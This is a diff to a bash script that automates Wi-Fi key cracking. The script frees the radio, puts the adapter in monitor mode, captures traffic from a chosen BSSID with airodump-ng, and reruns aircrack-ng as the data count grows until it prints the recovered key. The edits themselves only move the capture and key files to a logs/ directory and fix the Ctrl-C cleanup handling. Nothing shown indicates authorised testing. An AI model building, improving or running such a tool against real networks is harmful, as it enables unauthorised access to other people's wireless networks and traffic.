@@ -57,6 +57,12 @@ for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw; do
 done
 [[ "$MODE" == "active" || "$MODE" == "passive" ]] || { echo "[!] -m must be active|passive"; exit 1; }
 
+# ---- output location ------------------------------------------------------
+# All capture/key/log files live under logs/ (gitignored) to keep the repo clean.
+LOGDIR="logs"
+mkdir -p "$LOGDIR"
+OUT="${LOGDIR}/${PREFIX}"
+
 MON=""        # monitor interface name, discovered after airmon-ng start
 AIRODUMP_PID=""
 REPLAY_PID=""
@@ -69,7 +75,12 @@ cleanup() {
   systemctl start NetworkManager 2>/dev/null
   echo "[*] Monitor stopped, NetworkManager restarted. WiFi should be back."
 }
-trap cleanup EXIT INT TERM
+# cleanup runs exactly once, on the way out. Ctrl-C (INT) / TERM don't run
+# cleanup directly — they turn into a real exit, which fires the EXIT trap.
+# (Trapping cleanup on INT alone would run it but then resume the loop, so the
+# program never actually finished.)
+trap cleanup EXIT
+trap 'exit 130' INT TERM
 
 # ---- start monitor --------------------------------------------------------
 echo "[*] Freeing the radio (stopping NetworkManager/wpa_supplicant)..."
@@ -87,9 +98,9 @@ echo "[*] Locking to channel $CHANNEL..."
 iw dev "$MON" set channel "$CHANNEL" 2>/dev/null
 
 # ---- start capture --------------------------------------------------------
-rm -f "${PREFIX}"-*.cap "${PREFIX}"-*.csv 2>/dev/null
-echo "[*] Starting capture -> ${PREFIX}-01.cap (BSSID $BSSID, ch $CHANNEL)"
-airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "$PREFIX" --write-interval 1 "$MON" \
+rm -f "${OUT}"-*.cap "${OUT}"-*.csv 2>/dev/null
+echo "[*] Starting capture -> ${OUT}-01.cap (BSSID $BSSID, ch $CHANNEL)"
+airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "$OUT" --write-interval 1 "$MON" \
   >/dev/null 2>&1 &
 AIRODUMP_PID=$!
 sleep 4
@@ -122,11 +133,11 @@ fi
 # ---- crack loop -----------------------------------------------------------
 echo "[*] Watching #Data and retrying aircrack-ng every ${RETRY_SECS}s..."
 echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
-KEYFILE="${PREFIX}.key"
+KEYFILE="${OUT}.key"
 last_iv=0
 while true; do
   sleep "$RETRY_SECS"
-  CSV="${PREFIX}-01.csv"
+  CSV="${OUT}-01.csv"
   ivs=0
   if [[ -f "$CSV" ]]; then
     # column 11 (#Data) on the AP row matching our BSSID
@@ -137,11 +148,11 @@ while true; do
   # only bother running aircrack once we have a reasonable pile, and each time it grows
   if (( ivs >= 5000 )) && (( ivs - last_iv >= 2000 )); then
     last_iv=$ivs
-    if aircrack-ng -q -l "$KEYFILE" "${PREFIX}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
+    if aircrack-ng -q -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
       echo
       echo "============================================================"
       echo " KEY RECOVERED: $(cat "$KEYFILE")"
-      echo " Saved to: $KEYFILE   Capture: ${PREFIX}-01.cap"
+      echo " Saved to: $KEYFILE   Capture: ${OUT}-01.cap"
       echo "============================================================"
       exit 0
     fi
